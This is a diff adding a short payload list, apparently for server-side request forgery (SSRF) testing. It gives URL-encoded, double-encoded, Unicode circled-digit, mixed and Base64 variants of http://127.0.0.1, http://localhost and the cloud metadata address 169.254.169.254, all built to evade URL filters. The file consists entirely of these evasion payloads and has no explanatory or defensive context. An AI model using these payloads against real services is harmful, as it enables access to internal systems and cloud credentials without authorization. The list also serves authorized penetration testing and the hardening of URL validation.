@@ -1,0 +1,19 @@
+# URL Encoded
+%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31
+%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74
+
+# Double URL Encoded
+%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531
+
+# Unicode Encoded
+ⓗⓣⓣⓟ://①②⑦.⓪.⓪.①
+http://⑯⑨.②⑤④.⑯⑨.②⑤④
+
+# Mixed Encoding
+h%74%74p://127.0.0.1
+ht%74p://127.0.0.1
+htt%70://127.0.0.1
+
+# Base64 Encoded
+aHR0cDovLzEyNy4wLjAuMS8=
+aHR0cDovL2xvY2FsaG9zdC8=
